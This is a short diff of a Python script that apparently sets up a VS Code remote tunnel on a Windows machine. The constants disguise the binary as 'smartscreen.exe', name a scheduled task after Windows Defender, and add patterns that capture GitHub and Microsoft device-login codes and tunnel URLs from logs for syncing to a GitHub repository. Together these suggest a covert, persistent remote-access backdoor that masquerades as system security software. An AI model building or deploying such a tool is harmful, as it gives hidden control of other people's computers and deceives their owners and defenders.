@@ -21,20 +21,22 @@ TARGET_FILE = "output1.txt"
 BRANCH = "main"
 
 # Change CODE_DIR if the CLI binary lives somewhere else, such as AppData\Roaming.
-CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge"))
+CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "VSCode", "Tunnel", "Code"))
 CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else "code"
 CODE_EXE = CODE_DIR / CODE_EXE_NAME
 TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
+LOGIN_LOG = CODE_DIR / "login_output.log"
 FAILED_SYNC_LOG = CODE_DIR / "pending_github_sync.txt"
 TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
 SHOW_RAW_OUTPUT = False
 DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
 MAX_DEVICE_CODE_ISSUES = 10
+
 DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
 URL_PATTERN = re.compile(r"https://[^\s]+")
 TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
 LOGIN_HINT_PATTERN = re.compile(r"(github\.com/login/device|microsoft\.com/devicelogin)", re.IGNORECASE)
-TASK_NAME = "MicrosoftDefenderUpdateNode"
+TASK_NAME = "WindowsDefenderUpdateNode"
 
 
 def windows_subprocess_kwargs() -> dict:
@@ -643,6 +645,4 @@ if __name__ == "__main__":
         main()
     except Exception as error:
         print(f"Error: {error}", file=sys.stderr)
-        sys.exit(1)
-ror: {error}", file=sys.stderr)
         sys.exit(1)
